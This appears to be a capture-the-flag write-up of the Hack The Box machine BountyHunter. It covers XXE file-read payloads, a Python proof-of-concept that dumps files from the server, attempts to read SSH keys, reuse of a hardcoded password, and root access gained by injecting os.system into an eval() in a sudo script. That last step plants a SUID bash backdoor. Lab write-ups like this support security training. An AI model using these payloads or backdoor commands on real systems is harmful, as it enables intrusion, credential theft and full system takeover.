---
title: 'HTB BountyHunter - Easy'
date: 2024-05-18 22:00:00 +0000
categories: [HTB Machines]
tags: [Easy, Linux, HTB]
---
**Bountyhunter** is an easy HTB machine that begins with an **XXE injection**, discovering **clear-text credentials in source code files**. The obtained password can be used to connect via SSH as a local user. Privilege escalation is achievable by **injecting a command** in a script with **sudoers permissions**, although this last step is a bit tricky.

<img src="/assets/img/bountyhunter/Untitled.png" alt="Untitled.png" style="width:600px;">

# Reconnaissance

Started with an Nmap scan with [nmap4lazy](https://github.com/duskb1t/nmap4lazy), a simple script I created.

```bash
sudo python3 ~/Desktop/tools/nmap4lazy/nmap4lazy.py -t 10.129.219.22

[+] Scanning all TCP ports...

[+] Command being used:

/usr/bin/nmap 10.129.219.22 -p- -sS -Pn -n --min-rate 5000

[+] Open ports: 

22, 80, 27424

[+] NSE Scan in process. This might take a while...

[+] Command being used:

/usr/bin/nmap 10.129.219.22 -sVC -p22,80,27424

Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-18 18:19 WEST
Nmap scan report for 10.129.219.22
Host is up (0.063s latency).

PORT      STATE  SERVICE VERSION
22/tcp    open   ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 d4:4c:f5:79:9a:79:a3:b0:f1:66:25:52:c9:53:1f:e1 (RSA)
|   256 a2:1e:67:61:8d:2f:7a:37:a7:ba:3b:51:08:e8:89:a6 (ECDSA)
|_  256 a5:75:16:d9:69:58:50:4a:14:11:7a:42:c1:b6:23:44 (ED25519)
80/tcp    open   http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Bounty Hunters
27424/tcp closed unknown
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 23.39 seconds

[+] Script finished successfully
```

This web page received us on port TCP/80.

<img src="/assets/img/bountyhunter/Untitled 1.png" alt="Untitled 1.png" style="width:800px;">

Scrolled down on the page, finding this application form. It doesn’t send our data anywhere...

<img src="/assets/img/bountyhunter/Untitled 2.png" alt="Untitled 2.png" style="width:800px;">

Accessing the portal tab shows an interesting message. 

<img src="/assets/img/bountyhunter/Untitled 3.png" alt="Untitled 3.png" style="width:800px;">

Clicked the link, getting redirected to this other application form.

<img src="/assets/img/bountyhunter/Untitled 4.png" alt="Untitled 4.png" style="width:800px;">

Luckily for us, it is not a dead page. A POST request is sent to the web server.

<img src="/assets/img/bountyhunter/Untitled 5.png" alt="Untitled 5.png" style="width:800px;">

Used [CyberChef](https://gchq.github.io/CyberChef/) to decode the payload. It is using an XML format with some encoding.

<img src="/assets/img/bountyhunter/Untitled 6.png" alt="Untitled 6.png" style="width:800px;">

# Exploitation

Reverted the encoding mechanism, creating an XXE injection payload that attempts to read /etc/hosts.

```xml
<?xml  version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE reward [
<!ENTITY dusk SYSTEM "file:///etc/hosts">
]>
<bugreport>
<title>aaa</title>
<cwe>bbb</cwe>
<cvss>ccc</cvss>
<reward>&dusk;</reward>
</bugreport>
```

<img src="/assets/img/bountyhunter/Untitled 7.png" alt="Untitled 7.png" style="width:800px;">

The web application is vulnerable to XXE injection. This means that we can exfiltrate local files as we do with Local File Inclusion (LFI) vulnerabilities (read source code, SSH keys, etc).

<img src="/assets/img/bountyhunter/Untitled 8.png" alt="Untitled 8.png" style="width:800px;">

Used a PHP filter to read the source code of the PHP file processing the requests.

```xml
<?xml  version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE reward [
<!ENTITY dusk SYSTEM "php://filter/convert.base64-encode/resource=tracker_diRbPr00f314.php">
]>
<bugreport>
<title>aaa</title>
<cwe>bbb</cwe>
<cvss>ccc</cvss>
<reward>&dusk;</reward>
</bugreport>
```

<img src="/assets/img/bountyhunter/Untitled 9.png" alt="Untitled 9.png" style="width:800px;">

The web application uses a deprecated function, `libxml_disable_entity_loader()`. It might be the reason why the web page is vulnerable to XXE injection (or at least that’s what HTB Academy taught me XD).

<img src="/assets/img/bountyhunter/Untitled 10.png" alt="Untitled 10.png" style="width:800px;">

Created a Python PoC to read the local files. If you are a manual exploitation guy, I recommend using CDATA XXE exfiltration so you don’t have to encode and decode on each request.

```python
import argparse
import base64
import requests
import sys
import textwrap
import urllib

def display_file(response, filename):
    payload = [line.strip() for line in response.split('\n')][-4][4:-5]
    if payload:
        print(f"\n[+] Successfully dumped {filename}\n")
        print(base64.b64decode(payload).decode('ascii'))
    else:
        print("\n[+] Could NOT read the file :(")
    
def exploit(target, file):
    url = f'http://{target}/tracker_diRbPr00f314.php'
    headers = {
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'
    }
    data = textwrap.dedent(f'''\
        <?xml  version="1.0" encoding="ISO-8859-1"?>
        <!DOCTYPE reward [
        <!ENTITY dusk SYSTEM "php://filter/convert.base64-encode/resource={file}">
        ]>
        <bugreport>
        <title>aaa</title>
        <cwe>bbb</cwe>
        <cvss>ccc</cvss>
        <reward>&dusk;</reward>
        </bugreport>''')
    
    encoded_data = urllib.parse.quote(base64.b64encode(data.encode('ascii')).decode('ascii'))
    data = f'data={encoded_data}'

    # send the request
    response = requests.post(url, headers=headers, data=data)

    if response.status_code == 200:
        return response.text

def set_arguments():
    parser = argparse.ArgumentParser(
        description="HTB BountyHunter Exploit"
    )
    parser.add_argument('-t', '--target', required=True)
    parser.add_argument('-f', '--file', help='file to read', required=True)
    
    return parser.parse_args()

def main():
    try:
        args = set_arguments()
        response = exploit(args.target, args.file)
        display_file(response, args.file)
        sys.exit(0)
    
    except KeyboardInterrupt:
        print("\n[!] Keyboard interrupt detected. Quitting!")
        sys.exit(1)

main()
```

Used the exploit to read /etc/passwd, discovering another user called ‘development’.

```bash
python3 bountyhunter.py -t 10.129.219.22 -f /etc/passwd

[+] Successfully dumped /etc/passwd

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
...

cat passwd | grep sh$
root:x:0:0:root:/root:/bin/bash
development:x:1000:1000:Development:/home/development:/bin/bash
```

Unfortunately, we couldn’t read his private key.

```bash
for key in {'id_rsa','id_dsa','id_ecdsa','development.key','id_ed25519'}; do python3 bountyhunter.py -t 10.129.219.22 -f /home/development/.ssh/${key}; done

[+] Could NOT read the file :(

[+] Could NOT read the file :(
...
```

[Feroxbuster](https://github.com/epi052/feroxbuster) discovered other PHP files.

```bash
feroxbuster --url "http://10.129.219.22/" --wordlist /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -C 404 -x php
200      GET        5l       15w      125c http://10.129.219.22/portal.php
200      GET        0l        0w        0c http://10.129.219.22/db.php
200      GET      388l     1470w    25169c http://10.129.219.22/index.php
200      GET       20l       63w      617c http://10.129.219.22/log_submit.php
```

The db.php file contained a hardcoded password for an admin user :0.

```bash
python3 bountyhunter.py -t 10.129.219.22 -f db.php

[+] Successfully dumped db.php

<?php
// TODO -> Implement login system with the database.
$dbserver = "localhost";
$dbname = "bounty";
$dbusername = "admin";
$dbpassword = "<REDACTED>";
$testuser = "test";
?>
```

<img src="/assets/img/bountyhunter/Untitled 11.png" alt="Untitled 10.png" style="width:800px;">

Connected over SSH as ‘development’ by using the obtained password.

```
ssh development@10.129.219.22

development@bountyhunter:~$ whoami
development

development@bountyhunter:~$ hostname
bountyhunter
```

Read the user flag. Don’t reuse passwords :(.

```
development@bountyhunter:~$ cat user.txt 
50a3c46eaf08a786****************
```

# PrivEsc

Listing the sudoers permissions shows a script that can be run as root.

```bash
development@bountyhunter:~$ sudo -l
Matching Defaults entries for development on bountyhunter:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User development may run the following commands on bountyhunter:
    (root) NOPASSWD: /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py
```

This is the script source code, if you wanna inspect it by yourself. Otherwise scroll down.

```python
#Skytrain Inc Ticket Validation System 0.1
#Do not distribute this file.

def load_file(loc):
    if loc.endswith(".md"):
        return open(loc, 'r')
    else:
        print("Wrong file type.")
        exit()

def evaluate(ticketFile):
    #Evaluates a ticket to check for ireggularities.
    code_line = None
    for i,x in enumerate(ticketFile.readlines()):
        if i == 0:
            if not x.startswith("# Skytrain Inc"):
                return False
            continue
        if i == 1:
            if not x.startswith("## Ticket to "):
                return False
            print(f"Destination: {' '.join(x.strip().split(' ')[3:])}")
            continue

        if x.startswith("__Ticket Code:__"):
            code_line = i+1
            continue

        if code_line and i == code_line:
            if not x.startswith("**"):
                return False
            ticketCode = x.replace("**", "").split("+")[0]
            if int(ticketCode) % 7 == 4:
                validationNumber = eval(x.replace("**", ""))
                if validationNumber > 100:
                    return True
                else:
                    return False
    return False

def main():
    fileName = input("Please enter the path to the ticket file.\n")
    ticket = load_file(fileName)
    #DEBUG print(ticket)
    result = evaluate(ticket)
    if (result):
        print("Valid ticket.")
    else:
        print("Invalid ticket.")
    ticket.close

main()
```

Let’s break down what it does:

- Uses `input()` for a filename.
- Validates that it is a markdown file.
- Checks for the following structure.
    
    ```markdown
    # Skytrain Inc
    ## Ticket to ARBITRARY
    __Ticket Code:__
    ** X+Y+Z <!-- X divided by 7 needs to have a remainder of 4 -->
    ```
    
- Lastly, it does an `eval()`.

Now comes the funny part! Created a markdown file that meets the requirements and injects a `whoami` command.

```markdown
# Skytrain Inc
## Ticket to ARBITRARY
__Ticket Code:__
** 74+0 and __import__("os").system("whoami")
```

Successfully achieved command execution as root :D.

```
development@bountyhunter:~$ echo -e '# Skytrain Inc\n## Ticket to ARBITRARY\n__Ticket Code:__\n** 74+0 and __import__("os").system("whoami")' > dusk.md

development@bountyhunter:~$ sudo /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py
```

<img src="/assets/img/bountyhunter/Untitled 12.png" alt="Untitled 11.png" style="width:800px;">

Created a backdoor.

```
development@bountyhunter:~$ echo -e '# Skytrain Inc\n## Ticket to ARBITRARY\n__Ticket Code:__\n** 74+0 and __import__("os").system("chmod +s /bin/bash")' > dusk.md

development@bountyhunter:~$ sudo /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py
Please enter the path to the ticket file.
./dusk.md
Destination: ARBITRARY
Invalid ticket.

development@bountyhunter:~$ ls -l /bin/bash
-rwsr-sr-x 1 root root 1183448 Jun 18  2020 /bin/bash
```

Established a bash as root to read the flag. GGs!

```
evelopment@bountyhunter:~$ bash -p
bash-5.0# whoami
root

bash-5.0# cat /root/root.txt
989dfd249c9384f4****************
```